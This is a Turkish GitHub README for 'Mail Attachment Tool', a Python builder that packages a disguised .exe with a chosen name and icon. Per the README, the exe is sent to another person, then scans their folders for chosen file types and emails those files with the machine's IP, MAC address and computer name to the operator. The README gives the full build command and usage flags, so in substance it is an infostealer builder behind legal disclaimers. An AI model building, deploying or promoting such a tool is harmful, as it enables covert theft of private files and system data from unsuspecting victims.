# Mail Attachment Tool

![Yeni Proje (16)](https://github.com/ugurcomptech/MailAttachmentTool/assets/133202238/7af71d11-d685-4085-92bb-5d4596812cde)

Bu araç, dosya eklerken email göndermeye yardımcı olan bir araçtır. Kullanıcılar belirtilen dosya uzantılarını tarayarak istedikleri dosyaları belirledikleri alıcılara email ile gönderebilirler. Program, Python dilinde geliştirilmiş olup, dosyaları ve email gönderme işlemlerini kolayca yapabilmek için yagmail kütüphanesini kullanır. Ayrıca, gönderilen email'e hangi bilgisayardan gönderildiğine dair IP adresi, MAC adresi ve bilgisayar adı gibi sistem bilgilerini de ekleyebilme özelliği sunar. Lütfen bu aracı yalnızca alıcının izniyle ve yasal amaçlar için kullanın.



## Kurulum

1. Öncelikle, projeyi bilgisayarınıza indirin veya klonlayın:


   ```python
   https://github.com/ugurcomptech/MailAttachmentTool.git
   cd MailAttachmentTool
    ```

2. Gerekli Python paketlerini yüklemek için aşağıdaki komutu çalıştırın:

   ```python
      pip install -r requirements.txt
    ```


## Kullanım

1. Proje klasöründe, `MailAttach.py` dosyasını çalıştırın:

   ```python
   py MailAttach.py -s example@gmail.com  -p example_passowrd  -r  example@gmail.com -d C:/Users -f png -n example -i example.ico --email-subject example --email-body example
    ```


2. Program çalıştığında, sırasıyla aşağıdaki bilgileri girin:

- -s, --sender-email:(Sender Email): E-posta gönderenin e-posta adresi.
- -p, --passowrd:(Sender Password): E-posta gönderenin e-posta şifresi.
- -r. --receiver-email: Dosyaların gönderileceği alıcı e-posta adresi(Birden fazle E-posta hesabı belirleyebilirsiniz).
- -d, --folder-path: Dosyaların taramasını istediğiniz klasörün yolunu girin (örn: C:\my_folder).
- -f, --file-extensions: Taramak istediğiniz dosya uzantılarını boşluklarla ayrılarak girin (örn: pdf jpg png).
- -n, --exe-name: Oluşturulan exe dosyasının adı.
- -i, --icon: Oluşturulan exe dosyasının iconunu belirler.
- --email-subject: E-postanın konusunu belirler.
- --email-body: E-postanın içerik mesajını belirler.
- -h, --help: Argümanlarla ilgili bilgileri görüntülemenizi sağlar.


![video2](https://github.com/ugurcomptech/MailAttachmentTool/assets/133202238/63d74731-f8ec-48b4-a856-a4c1c97db038)

3. Gerekli bilgileri girdikten sonra, "exe" haline gelicek ve bunu karşı tarafa attığınız da belirttiğiniz dosya uzantılarına sahip dosyaları taramaya başlayacak ve e-posta ile belirtilen alıcıya gönderecektir.

4. E-posta hesabınızda "uygulama şifreleri" bölümüne gelerek bir şifre oluşturunuz ve onu kullanınız.


**Önemli:** Birden fazla dosya türü belirttiğinizde, dosya tarama işlemi "C:/" gibi geniş alanları taradığınızda ve birden fazla e-posta adresi belirttiğinizde sistemde yavaşlama yaşanabilir. Bu nedenle, dosya tarama ve e-posta adresi belirtme işlemlerini dikkatli bir şekilde yapmanız gerekmektedir.


**Dikkat:** Mail Attachment Tool, saldırı amaçlı kullanıma karşı sıkı bir şekilde uyarılmaktadır. Bu aracın geliştiricileri veya katkıda bulunanlar, aracın kötüye kullanımından sorumlu değildir ve kötü amaçlı eylemlerde kullanıldığında herhangi bir sorumluluk kabul etmez. Kullanıcılar, bu aracı yalnızca yasal ve meşru amaçlar için kullanmalıdır.

## Sorumluluk Reddi
Bu araç, açık kaynaklı olarak sunulmaktadır ve herhangi bir garanti veya taahhüt olmaksızın sağlanmaktadır. Araç kullanımından veya kullanılamamasından doğacak herhangi bir sorumluluk kabul edilmez. Kullanıcılar, bu aracı kendi sorumlulukları altında kullanmalı ve oluşturulan .exe dosyasını kendi riskleriyle kullanmalıdır.

## Lisans

[![License: CC BY-NC-SA 4.0](https://licensebuttons.net/l/by-nc-sa/4.0/88x31.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/legalcode)

Bu projeyi [Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License](https://creativecommons.org/licenses/by-nc-sa/4.0/legalcode) altında lisansladık. Lisansın tam açıklamasını [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/legalcode) sayfasında bulabilirsiniz.


